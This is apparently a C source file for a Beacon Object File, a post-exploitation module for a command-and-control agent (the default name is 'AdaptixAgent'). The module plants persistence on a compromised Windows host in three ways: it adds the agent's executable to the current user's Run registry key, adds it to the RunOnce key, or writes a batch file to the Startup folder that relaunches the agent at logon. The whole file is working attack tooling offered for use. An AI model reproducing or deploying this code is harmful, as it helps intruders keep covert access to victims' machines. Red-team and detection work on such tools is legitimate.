#include <windows.h>
#include "beacon.h"

DECLSPEC_IMPORT LSTATUS WINAPI ADVAPI32$RegCreateKeyExA(HKEY, LPCSTR, DWORD, LPSTR, DWORD, REGSAM, LPSECURITY_ATTRIBUTES, PHKEY, PDWORD);
DECLSPEC_IMPORT LSTATUS WINAPI ADVAPI32$RegSetValueExA(HKEY, LPCSTR, DWORD, DWORD, CONST BYTE*, DWORD);
DECLSPEC_IMPORT LSTATUS WINAPI ADVAPI32$RegCloseKey(HKEY);
DECLSPEC_IMPORT DWORD WINAPI KERNEL32$GetModuleFileNameA(HMODULE, LPSTR, DWORD);
DECLSPEC_IMPORT DWORD WINAPI KERNEL32$GetEnvironmentVariableA(LPCSTR, LPSTR, DWORD);
DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$CreateFileA(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
DECLSPEC_IMPORT BOOL WINAPI KERNEL32$WriteFile(HANDLE, LPCVOID, DWORD, LPDWORD, LPOVERLAPPED);
DECLSPEC_IMPORT BOOL WINAPI KERNEL32$CloseHandle(HANDLE);
DECLSPEC_IMPORT size_t WINAPI MSVCRT$strlen(const char*);

DECLSPEC_IMPORT LRESULT WINAPI USER32$wsprintfA(char*, const char*, ...);

void go(char *args, int len) {
    datap parser;
    BeaconDataParse(&parser, args, len);
    
    int mode = BeaconDataInt(&parser);
    char *name = BeaconDataExtract(&parser, NULL);
    char *value = BeaconDataExtract(&parser, NULL);
    
    HKEY hKey;
    LSTATUS result;
    
    char exePath[MAX_PATH] = {0};
    KERNEL32$GetModuleFileNameA(NULL, exePath, MAX_PATH);
    
    if (mode == 0) {
        result = ADVAPI32$RegCreateKeyExA(HKEY_CURRENT_USER, 
            "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 
            0, NULL, 0, KEY_SET_VALUE, NULL, &hKey, NULL);
        
        if (result == ERROR_SUCCESS) {
            if (!value) value = exePath;
            result = ADVAPI32$RegSetValueExA(hKey, name ? name : "AdaptixAgent", 0, REG_SZ, (BYTE*)value, (DWORD)MSVCRT$strlen(value) + 1);
            ADVAPI32$RegCloseKey(hKey);
            
            if (result == ERROR_SUCCESS) {
                BeaconPrintf(CALLBACK_OUTPUT, "[+] Registry Run key added: %s -> %s", name ? name : "AdaptixAgent", value);
            } else {
                BeaconPrintf(CALLBACK_ERROR, "[-] Failed to set registry value");
            }
        } else {
            BeaconPrintf(CALLBACK_ERROR, "[-] Failed to create registry key: %d", result);
        }
    }
    else if (mode == 1) {
        result = ADVAPI32$RegCreateKeyExA(HKEY_CURRENT_USER, 
            "Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce", 
            0, NULL, 0, KEY_SET_VALUE, NULL, &hKey, NULL);
        
        if (result == ERROR_SUCCESS) {
            if (!value) value = exePath;
            result = ADVAPI32$RegSetValueExA(hKey, name ? name : "AdaptixAgent", 0, REG_SZ, (BYTE*)value, (DWORD)MSVCRT$strlen(value) + 1);
            ADVAPI32$RegCloseKey(hKey);
            
            if (result == ERROR_SUCCESS) {
                BeaconPrintf(CALLBACK_OUTPUT, "[+] Registry RunOnce key added: %s -> %s", name ? name : "AdaptixAgent", value);
            } else {
                BeaconPrintf(CALLBACK_ERROR, "[-] Failed to set registry value");
            }
        } else {
            BeaconPrintf(CALLBACK_ERROR, "[-] Failed to create registry key: %d", result);
        }
    }
    else if (mode == 2) {
        char appData[MAX_PATH] = {0};
        KERNEL32$GetEnvironmentVariableA("APPDATA", appData, MAX_PATH);
        
        if (appData[0]) {
            char linkPath[MAX_PATH] = {0};
            char batContent[512] = {0};
            DWORD written;
            
            USER32$wsprintfA(linkPath, "%s\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\%s.bat", appData, name ? name : "agent");
            USER32$wsprintfA(batContent, "@echo off\r\nstart \"\" \"%s\"\r\n", exePath);
            
            HANDLE hFile = KERNEL32$CreateFileA(linkPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
            if (hFile != INVALID_HANDLE_VALUE) {
                KERNEL32$WriteFile(hFile, batContent, (DWORD)MSVCRT$strlen(batContent), &written, NULL);
                KERNEL32$CloseHandle(hFile);
                BeaconPrintf(CALLBACK_OUTPUT, "[+] Startup batch created: %s", linkPath);
            } else {
                BeaconPrintf(CALLBACK_ERROR, "[-] Failed to create startup file");
            }
        }
    }
}
